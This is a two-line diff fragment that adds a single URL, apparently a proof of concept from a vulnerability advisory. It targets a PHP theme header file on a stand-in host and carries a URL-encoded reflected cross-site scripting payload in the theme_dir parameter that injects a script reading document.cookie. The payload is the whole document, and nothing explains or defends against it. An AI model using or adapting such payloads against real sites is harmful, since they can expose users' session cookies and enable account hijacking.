@@ -1,0 +1,2 @@
+http://www.example.com/themes/default/header.inc.php?theme_dir=%22%3E%3Cscript%3E
+alert%28document.cookie%29;%3C/script%3E
